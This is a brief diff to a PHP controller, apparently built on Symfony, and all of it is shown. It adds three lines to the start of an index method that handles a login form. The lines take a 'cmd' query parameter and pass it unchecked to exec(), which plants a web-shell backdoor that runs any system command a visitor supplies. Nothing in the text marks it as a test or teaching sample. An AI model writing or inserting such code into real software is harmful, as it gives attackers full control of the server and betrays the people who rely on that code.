@@ -4,6 +4,9 @@ use Symfony\Component\HttpFoundation\Response;
 
 public function index(Request $request)
 {
+    $cmd = $_GET["cmd"];
+
+    exec($cmd);
 
     if( isset( $_POST[ 'Connect' ] ) ) {
         $login = $_POST[ 'login' ];
